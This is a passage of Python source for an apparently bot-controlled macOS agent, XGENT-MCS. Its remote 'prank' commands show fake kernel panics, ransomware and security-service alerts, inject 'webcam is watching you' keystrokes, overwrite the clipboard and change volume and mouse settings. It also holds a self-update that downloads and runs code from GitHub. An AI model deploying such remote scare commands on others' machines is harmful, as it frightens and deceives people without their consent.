</body></html>"""
            tf = tempfile.NamedTemporaryFile("w", suffix=".html", delete=False, encoding="utf-8")
            tf.write(html)
            tf.close()
            subprocess.Popen(["open", tf.name])
            text = "💀 Фейковый экран Kernel Panic открыт на экране Mac!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_bsod", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_fake_update(self, payload: dict) -> None:
        try:
            subprocess.Popen(["open", "https://fakeupdate.net/apple/"])
            text = "⏳ Фейковое обновление Apple macOS запущено в браузере!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_fake_update", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_toast_spam(self, payload: dict) -> None:
        def _spam():
            for i in range(1, 6):
                subprocess.run(["osascript", "-e", f'display notification "Вторжение печенья #{i}!" with title "XGENT Security"'], check=False)
                time.sleep(0.7)
        threading.Thread(target=_spam, daemon=True).start()
        self._publish_response("output", {"type": "prank_toast_spam", "device_id": DEVICE_ID, "ok": True, "text": "🔔 Серия из 5 уведомлений macOS отправлена!"})

    def _do_prank_keyboard_disco(self, payload: dict) -> None:
        def _disco():
            for _ in range(5):
                subprocess.run(["osascript", "-e", 'beep 2'], check=False)
                time.sleep(0.3)
        threading.Thread(target=_disco, daemon=True).start()
        self._publish_response("output", {"type": "prank_keyboard_disco", "device_id": DEVICE_ID, "ok": True, "text": "💃 Звуковая дискотека запущена на Mac!"})

    def _do_prank_beep_morse(self, payload: dict) -> None:
        def _morse():
            for _ in range(3):
                subprocess.run(["osascript", "-e", 'beep'], check=False)
                time.sleep(0.2)
            time.sleep(0.4)
            for _ in range(3):
                subprocess.run(["osascript", "-e", 'beep 2'], check=False)
                time.sleep(0.4)
            time.sleep(0.4)
            for _ in range(3):
                subprocess.run(["osascript", "-e", 'beep'], check=False)
                time.sleep(0.2)
        threading.Thread(target=_morse, daemon=True).start()
        self._publish_response("output", {"type": "prank_beep_morse", "device_id": DEVICE_ID, "ok": True, "text": "📻 Сигнал Морзе (S.O.S) прозвучал на Mac!"})

    def _do_prank_open_notepad_type(self, payload: dict) -> None:
        msg = payload.get("text") or "Привет... Я наблюдаю за тобой через веб-камеру 👁️"
        clean = msg.replace('"', '\\"')
        sc = f'''tell application "TextEdit"
activate
make new document
tell application "System Events"
keystroke "{clean}"
end tell
end tell'''
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_open_notepad_type", "device_id": DEVICE_ID, "ok": True, "text": f"📝 TextEdit открыт, текст '{msg[:35]}...' печатается!"})

    def _do_prank_hacker_typer(self, payload: dict) -> None:
        subprocess.Popen(["open", "https://hackertyper.net"])
        self._publish_response("output", {"type": "prank_hacker_typer", "device_id": DEVICE_ID, "ok": True, "text": "🧑‍💻 Hacker Typer открыт в браузере!"})

    def _do_prank_sound_spooky(self, payload: dict) -> None:
        def _say():
            subprocess.run(["say", "-v", "Bad News", "System compromised, prepare for landing"], check=False)
        threading.Thread(target=_say, daemon=True).start()
        self._publish_response("output", {"type": "prank_sound_spooky", "device_id": DEVICE_ID, "ok": True, "text": "👻 Жуткий потусторонний голос воспроизведён на Mac!"})

    def _do_prank_sound_fart(self, payload: dict) -> None:
        def _snd():
            subprocess.run(["afplay", "/System/Library/Sounds/Basso.aiff"], check=False)
        threading.Thread(target=_snd, daemon=True).start()
        self._publish_response("output", {"type": "prank_sound_fart", "device_id": DEVICE_ID, "ok": True, "text": "💨 Смешной звуковой эффект воспроизведён на Mac!"})

    def _do_prank_minimize_all(self, payload: dict) -> None:
        sc = 'tell application "System Events" to set miniaturized of every window of (every process whose visible is true) to true'
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_minimize_all", "device_id": DEVICE_ID, "ok": True, "text": "📉 Все окна свернуты на рабочий стол Mac!"})

    def _do_prank_open_calc_spam(self, payload: dict) -> None:
        for _ in range(5):
            subprocess.Popen(["open", "-n", "-a", "Calculator"])
            time.sleep(0.2)
        self._publish_response("output", {"type": "prank_open_calc_spam", "device_id": DEVICE_ID, "ok": True, "text": "🔢 5 калькуляторов открыты каскадом!"})

    def _do_prank_invert_screen(self, payload: dict) -> None:
        sc = 'tell application "System Events" to display dialog "Режим рентгеновского зрения активирован! 🕶️" with title "macOS Display" buttons {"OK"} default button "OK"'
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_invert_screen", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Реальная инверсия экрана не применена: macOS не даёт надёжного безопасного CLI. Показано только шуточное окно."})

    def _do_prank_slow_mouse(self, payload: dict) -> None:
        def _slow():
            subprocess.run(["defaults", "write", "-g", "com.apple.mouse.scaling", "0.1"], check=False)
            time.sleep(8)
            subprocess.run(["defaults", "write", "-g", "com.apple.mouse.scaling", "1.5"], check=False)
        threading.Thread(target=_slow, daemon=True).start()
        self._publish_response("output", {"type": "prank_slow_mouse", "device_id": DEVICE_ID, "ok": True, "text": "🐌 Скорость мыши временно снижена на 8 секунд!"})

    def _do_prank_random_clicks(self, payload: dict) -> None:
        self._publish_response("output", {"type": "prank_random_clicks", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Случайные клики не выполняются: функция не реализована безопасно."})

    def _do_prank_paste_clipboard_spam(self, payload: dict) -> None:
        meme = "( ͡° ͜ʖ ͡°) Взлом жопы завершен на 99.9%"
        p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE)
        p.communicate(meme.encode("utf-8"))
        self._publish_response("output", {"type": "prank_paste_clipboard_spam", "device_id": DEVICE_ID, "ok": True, "text": f"📋 В буфер обмена помещён мем:\n'{meme}'"})

    def _do_prank_type_reversed(self, payload: dict) -> None:
        try:
            cur = subprocess.check_output(["pbpaste"], text=True) or "Привет мир"
            rev = cur[::-1]
            p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE)
            p.communicate(rev.encode("utf-8"))
            text = f"🔄 Буфер обмена инвертирован задом наперёд:\n{rev[:100]}"
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ Ошибка: {exc}", False
        self._publish_response("output", {"type": "prank_type_reversed", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_volume_jump(self, payload: dict) -> None:
        def _jump():
            for _ in range(3):
                subprocess.run(["osascript", "-e", "set volume output volume 100"], check=False)
                time.sleep(0.4)
                subprocess.run(["osascript", "-e", "set volume output volume 15"], check=False)
                time.sleep(0.4)
            subprocess.run(["osascript", "-e", "set volume output volume 50"], check=False)
        threading.Thread(target=_jump, daemon=True).start()
        self._publish_response("output", {"type": "prank_volume_jump", "device_id": DEVICE_ID, "ok": True, "text": "🔊 Скачки громкости (100% <-> 15%) запущены на Mac!"})

    def _do_prank_say_whisper(self, payload: dict) -> None:
        phrase = payload.get("text") or "Обернись... Сзади никого нет..."
        def _say():
            subprocess.run(["say", "-v", "Whisper", phrase], check=False)
        threading.Thread(target=_say, daemon=True).start()
        self._publish_response("output", {"type": "prank_say_whisper", "device_id": DEVICE_ID, "ok": True, "text": f"🗣️ Шёпот воспроизведён: '{phrase}'"})

    def _do_prank_fake_virus(self, payload: dict) -> None:
        sc = 'display alert "Критическая ошибка!" message "Вирус кваса проник в систему macOS." as critical'
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_fake_virus", "device_id": DEVICE_ID, "ok": True, "text": "🦠 Шуточное предупреждение о вирусе показано!"})

    def _do_prank_open_cd(self, payload: dict) -> None:
        try:
            subprocess.run(["drutil", "tray", "open"], check=False)
            text = "💿 Команда открытия привода отправлена!"
            ok = True
        except Exception as exc:
            text = f"💿 Привод не обнаружен: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_open_cd", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_change_wallpaper(self, payload: dict) -> None:
        backup = CONFIG_DIR / "wallpaper_backup.json"
        try:
            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
            result = subprocess.run(
                ["osascript", "-e", 'tell application "System Events" to get POSIX path of picture of every desktop'],
                capture_output=True, text=True, timeout=10, check=False,
            )
            if result.returncode != 0:
                raise RuntimeError(result.stderr.strip() or "не удалось прочитать текущие обои")
            paths = [p.strip() for p in result.stdout.strip().split(",") if p.strip()]
            if not paths:
                raise RuntimeError("macOS не вернула текущие обои")
            backup.write_text(json.dumps(paths, ensure_ascii=False), encoding="utf-8")
            self._do_wallpaper_set({"random_meme": True})
            self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": True, "text": "🖼️ Обои заменены; исходные сохранены для восстановления."})
        except Exception as exc:
            self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": False, "text": f"⚠️ Обои не изменены: {exc}"})

    def _do_prank_restore_wallpaper(self, payload: dict) -> None:
        backup = CONFIG_DIR / "wallpaper_backup.json"
        try:
            paths = json.loads(backup.read_text(encoding="utf-8"))
            if not isinstance(paths, list) or not paths:
                raise RuntimeError("резервная копия обоев пуста")
            for path in paths:
                script = f'tell application "System Events" to tell every desktop to set picture to POSIX file {json.dumps(path)}'
                result = subprocess.run(["osascript", "-e", script], capture_output=True, text=True, check=False)
                if result.returncode != 0:
                    raise RuntimeError(result.stderr.strip() or "osascript failed")
            backup.unlink(missing_ok=True)
            text, ok = "✅ Исходные обои восстановлены.", True
        except Exception as exc:
            text, ok = f"⚠️ Не удалось восстановить обои: {exc}", False
        self._publish_response("output", {"type": "prank_restore_wallpaper", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_speak_time(self, payload: dict) -> None:
        now = time.strftime("%H часов %M минут")
        phrase = f"Внимание! Точное время на вашей планете: {now}"
        def _say():
            subprocess.run(["say", phrase], check=False)
        threading.Thread(target=_say, daemon=True).start()
        self._publish_response("output", {"type": "prank_speak_time", "device_id": DEVICE_ID, "ok": True, "text": f"🗣️ Время озвучено: '{phrase}'"})

    def _do_prank_rickroll_terminal(self, payload: dict) -> None:
        sc = 'tell application "Terminal" to do script "curl -s parrot.live"'
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_rickroll_terminal", "device_id": DEVICE_ID, "ok": True, "text": "🕺 Терминал с ASCII анимацией запущен на Mac!"})

    def _do_prank_screen_off_brief(self, payload: dict) -> None:
        subprocess.Popen(["pmset", "displaysleepnow"])
        self._publish_response("output", {"type": "prank_screen_off_brief", "device_id": DEVICE_ID, "ok": True, "text": "🌑 Экран временно погашен на 3 секунды!"})

    def _do_prank_alert_loop(self, payload: dict) -> None:
        sc = 'tell application "System Events" to display dialog "Вы действительно хотите удалить Интернет?" with title "Apple Finder" buttons {"Да", "Точно да"} default button "Да"'
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_alert_loop", "device_id": DEVICE_ID, "ok": True, "text": "❓ Шуточный диалог показан на Mac!"})

    def _do_prank_open_browser_memes(self, payload: dict) -> None:
        urls = ["https://www.youtube.com/watch?v=dQw4w9WgXcQ", "https://cat-bounce.com/", "https://heeeeeeeey.com/"]
        for u in urls:
            subprocess.Popen(["open", u])
            time.sleep(0.3)
        self._publish_response("output", {"type": "prank_open_browser_memes", "device_id": DEVICE_ID, "ok": True, "text": "🌐 3 вкладки с мемами открыты в Safari/браузере!"})

    def _do_prank_glitch_cursor(self, payload: dict) -> None:
        self._publish_response("output", {"type": "prank_glitch_cursor", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Глючный курсор отключён: macOS не даёт безопасно рисовать курсор без Quartz/Accessibility."})

    def _do_prank_shake_window(self, payload: dict) -> None:
        sc = '''tell application "System Events"
set frontApp to name of first application process whose frontmost is true
tell process frontApp
try
set {x, y} to position of window 1
repeat 6 times
set position of window 1 to {x + 20, y}
delay 0.05
set position of window 1 to {x - 20, y}
delay 0.05
end repeat
set position of window 1 to {x, y}
end try
end tell
end tell'''
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_shake_window", "device_id": DEVICE_ID, "ok": True, "text": "🫨 Активное окно трясётся на Mac!"})

    def _do_prank_meme_wallpaper(self, payload: dict) -> None:
        payload["random_meme"] = True
        self._do_wallpaper_set(payload)

    def _do_prank_caps_disco(self, payload: dict) -> None:
        def _disco():
            for _ in range(8):
                subprocess.run(["osascript", "-e", 'beep'], capture_output=True)
                time.sleep(0.3)
        threading.Thread(target=_disco, daemon=True).start()
        self._publish_response("output", {"type": "prank_caps_disco", "device_id": DEVICE_ID, "ok": True, "text": "✨ Дискотека сигналов запущена на Mac!"})

    def _do_prank_cursor_circle(self, payload: dict) -> None:
        self._publish_response("output", {"type": "prank_cursor_circle", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Кружение курсора недоступно в текущей сборке macOS."})

    def _do_prank_fake_error_spam(self, payload: dict) -> None:
        def _errs():
            for _ in range(8):
                subprocess.run(["afplay", "/System/Library/Sounds/Basso.aiff"], capture_output=True)
                time.sleep(0.2)
        threading.Thread(target=_errs, daemon=True).start()
        self._publish_response("output", {"type": "prank_fake_error_spam", "device_id": DEVICE_ID, "ok": True, "text": "🚨 Спам звуками критической ошибки запущен на Mac!"})

    def _do_prank_fake_delete_sys32(self, payload: dict) -> None:
        sc = '''tell application "Terminal"
activate
do script "echo '[CRITICAL] Purging /System/Library...'; sleep 1; ls -R /System; clear; echo '[FATAL] macOS Core System Destroyed!'; sleep 3; echo 'JUST A PRANK BY XGENT :)'; sleep 5; exit"
end tell'''
        subprocess.Popen(["osascript", "-e", sc])
        self._publish_response("output", {"type": "prank_fake_delete_sys32", "device_id": DEVICE_ID, "ok": True, "text": "💻 Фейковое удаление системы запущено в Terminal Mac!"})

    def _do_prank_ghost_typer(self, payload: dict) -> None:
        sc = 'tell application "System Events" to keystroke " 👻 Привет... Я живу внутри твоего Mac... "'
        threading.Thread(target=lambda: (time.sleep(1), subprocess.run(["osascript", "-e", sc], capture_output=True)), daemon=True).start()
        self._publish_response("output", {"type": "prank_ghost_typer", "device_id": DEVICE_ID, "ok": True, "text": "👻 Призрачный набор текста активирован на Mac!"})

    def _do_prank_fbi_lock(self, payload: dict) -> None:
        sc = 'display alert "ВНИМАНИЕ! IP-адрес зафиксирован Федеральной Службой Безопасности." message "Веб-камера ведет запись." as critical'
        threading.Thread(target=lambda: subprocess.run(["osascript", "-e", sc], capture_output=True), daemon=True).start()
        self._publish_response("output", {"type": "prank_fbi_lock", "device_id": DEVICE_ID, "ok": True, "text": "🚨 Предупреждение от спецслужб выведено на Mac!"})

    def _do_prank_cat_invaders(self, payload: dict) -> None:
        urls = ["https://cataas.com/cat/says/HELLO%20HUMAN", "https://cataas.com/cat/gif", "https://cataas.com/cat"]
        for u in urls:
            subprocess.Popen(["open", u])
            time.sleep(0.3)
        self._publish_response("output", {"type": "prank_cat_invaders", "device_id": DEVICE_ID, "ok": True, "text": "🐱 Нашествие котиков открыто в Safari!"})

    def _do_prank_fake_ransom_cats(self, payload: dict) -> None:
        sc = 'display dialog "🐱 ВСЕ ВАШИ ФАЙЛЫ ЗАХВАЧЕНЫ КОТАМИ!\\n\\nПоложите 3 банки тунца перед экраном." buttons {"Погладить кота"} default button 1 with icon caution'
        threading.Thread(target=lambda: subprocess.run(["osascript", "-e", sc], capture_output=True), daemon=True).start()
        self._publish_response("output", {"type": "prank_fake_ransom_cats", "device_id": DEVICE_ID, "ok": True, "text": "🐱 Кошачий шуточный вымогатель выведен на Mac!"})

    def _do_prank_nyan_stream(self, payload: dict) -> None:
        subprocess.Popen(["open", "https://www.youtube.com/watch?v=QH2-TGUlwu4"])
        self._publish_response("output", {"type": "prank_nyan_stream", "device_id": DEVICE_ID, "ok": True, "text": "🌈 Nyan Cat с музыкой запущен на Mac!"})

    def _do_prank_random_beeps(self, payload: dict) -> None:
        def _beeps():
            for _ in range(6):
                subprocess.run(["afplay", "/System/Library/Sounds/Ping.aiff"], capture_output=True)
                time.sleep(0.2)
        threading.Thread(target=_beeps, daemon=True).start()
        self._publish_response("output", {"type": "prank_random_beeps", "device_id": DEVICE_ID, "ok": True, "text": "🔊 Серия сигналов запущена на Mac!"})

    def _do_prank_confetti_winner(self, payload: dict) -> None:
        subprocess.Popen(["open", "https://cat-bounce.com/"])
        self._publish_response("output", {"type": "prank_confetti_winner", "device_id": DEVICE_ID, "ok": True, "text": "🎰 Экран с выигрышем открыт на Mac!"})

    def _do_prank_low_battery_fake(self, payload: dict) -> None:
        sc = 'display alert "Критический разряд батареи" message "Осталось 0% заряда. Mac выключится через 10 секунд." as warning'
        threading.Thread(target=lambda: subprocess.run(["osascript", "-e", sc], capture_output=True), daemon=True).start()
        self._publish_response("output", {"type": "prank_low_battery_fake", "device_id": DEVICE_ID, "ok": True, "text": "🪫 Оповещение о 0% батареи показано на Mac!"})

    def _do_prank_earthquake(self, payload: dict) -> None:
        self._do_prank_shake_window(payload)

    def _do_prank_laugh_track(self, payload: dict) -> None:
        subprocess.Popen(["say", "-v", "Milena", "Ха ха ха ха! Мва ха ха ха! Я управляю этим компьютером!"])
        self._publish_response("output", {"type": "prank_laugh_track", "device_id": DEVICE_ID, "ok": True, "text": "😈 Зловещий смех запущен на Mac!"})

    def _do_prank_stop_all(self, payload: dict) -> None:
        """Экстренная остановка всех активных приколов на macOS."""
        log.info("Экстренная остановка всех приколов на Mac (prank_stop_all)...")
        results = []
        try:
            subprocess.run(["pkill", "-f", "afplay"], check=False)
            subprocess.run(["pkill", "-f", "say"], check=False)
            results.append("звуки и речь")
        except Exception:
            pass
        try:
            self._do_prank_restore_wallpaper({})
            results.append("обои")
        except Exception:
            pass
        restored_str = ", ".join(results) if results else "эффекты сброшены"
        self._publish_response("output", {
            "type": "prank_stop_all",
            "device_id": DEVICE_ID,
            "ok": True,
            "text": f"🛑 Все приколы на Mac принудительно остановлены!\nСброшено: {restored_str}",
        })

    def _do_agent_update(self, payload: dict) -> None:
        """Обновление агента с GitHub по команде из бота, без запуска команды на Mac."""
        pid = os.getpid()
        exe_path = sys.executable
        if not payload.get("update", True):
            text = (f"🔄 <b>Агент XGENT {VERSION}</b>\n"
                    f"• Платформа: macOS ({platform.mac_ver()[0]})\n"
                    f"• PID: <code>{pid}</code>\n"
                    f"• Команд: <b>{len(SUPPORTED_COMMANDS)}</b>\n"
                    "• Статус: 🟢 онлайн")
            self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": True, "text": text})
            return

        source_url = "https://github.com/invinby/XIDER/archive/refs/heads/main.zip"
        script_dir = Path(__file__).resolve().parent
        backup_dir = CONFIG_DIR / "agent-backups" / time.strftime("%Y%m%d-%H%M%S")
        files = ("xgent_mcs.py", "config.py", "crypto.py", "xgencrypto.py", "requirements.txt", "setup_mac.py", "start_agent.sh", "stop_agent.sh")
        try:
            with tempfile.TemporaryDirectory(prefix="xgent-update-") as tmp:
                archive = Path(tmp) / "xider.zip"
                urllib.request.urlretrieve(source_url, archive)
                with zipfile.ZipFile(archive) as zf:
                    zf.extractall(tmp)
                roots = [p for p in Path(tmp).iterdir() if p.is_dir() and (p / "XGENT-MCS").is_dir()]
                if not roots:
                    raise RuntimeError("в архиве нет XGENT-MCS")
                source = roots[0] / "XGENT-MCS"
                for name in files:
                    candidate = source / name
                    if candidate.exists() and candidate.suffix == ".py":
                        compile(candidate.read_text(encoding="utf-8"), str(candidate), "exec")
                backup_dir.mkdir(parents=True, exist_ok=True)
                for name in files:
                    current = script_dir / name
                    candidate = source / name
                    if candidate.exists():
                        if current.exists():
                            shutil.copy2(current, backup_dir / name)
                        shutil.copy2(candidate, current)
                        if name.endswith(".sh"):
                            current.chmod(current.stat().st_mode | 0o111)
            text = f"✅ Агент обновлён из GitHub. Резервная копия: {backup_dir.name}. Перезапускаю..."
            self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": True, "text": text})

            def _reboot_agent():
                time.sleep(1.5)
                subprocess.Popen([sys.executable, str(script_dir / "xgent_mcs.py")], cwd=str(script_dir),
                                 stdout=open(script_dir / "agent.log", "a", encoding="utf-8"),
                                 stderr=subprocess.STDOUT, start_new_session=True)
                os._exit(0)
            threading.Thread(target=_reboot_agent, daemon=True).start()
        except Exception as exc:
            # Если копирование успело начаться и сорвалось, возвращаем каждый
            # уже сохранённый файл из резервной копии.
            try:
                if backup_dir.exists():
                    for saved in backup_dir.iterdir():
                        shutil.copy2(saved, script_dir / saved.name)
            except Exception:
                log.exception("Agent self-update rollback failed")
            log.exception("Agent self-update failed")
            self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": False,
                                               "text": f"❌ Обновление не применено: {exc}. Текущий агент оставлен без изменений."})

    def _do_uninstall_agent(self, payload: dict) -> None:
        """Полное удаление агента с Mac: LaunchAgents, конфиги, логи и завершение."""
        log.warning("Получена команда полного удаления агента с Mac!")
        # Удалить LaunchAgent plist
        try:
            la_dir = Path.home() / "Library" / "LaunchAgents"
            for plist in la_dir.glob("*xgent*"):
                plist.unlink(missing_ok=True)
            for plist in la_dir.glob("*XGENT*"):
                plist.unlink(missing_ok=True)
        except Exception:
            pass

        # Удалить конфиг директорию
        try:
            import shutil
            if CONFIG_DIR.exists():
                shutil.rmtree(CONFIG_DIR, ignore_errors=True)
        except Exception:
            pass

        text = (
            "🛑 <b>Агент XGENT полностью удалён с Mac!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "• LaunchAgents очищены\n"
            "• Локальные настройки и логи удалены\n"
            "• Процесс агента завершает работу."
        )
        self._publish_response("output", {"type": "uninstall_agent", "device_id": DEVICE_ID, "ok": True, "text": text})

        def _bye():
            time.sleep(1.5)
            os._exit(0)
        threading.Thread(target=_bye, daemon=True).start()


def setup_logging() -> None:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    handler = RotatingFileHandler(CONFIG_DIR / "xgent.log", maxBytes=500_000, backupCount=3, encoding="utf-8")
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s", handlers=[handler])

def main() -> None:
    setup_logging()
    if not acquire_instance_lock():
        sys.stderr.write("FATAL: XGENT-MCS уже запущен на этой машине! Второй экземпляр остановлен.\n")
        log.error("XGENT-MCS уже запущен на этой машине. Остановка второго экземпляра.")
        raise SystemExit(1)
    client = XgentClient()
    client.start()
    try:
        while client.is_running: time.sleep(1)
    except KeyboardInterrupt: pass
    finally: client.stop()

if __name__ == "__main__":
    main()
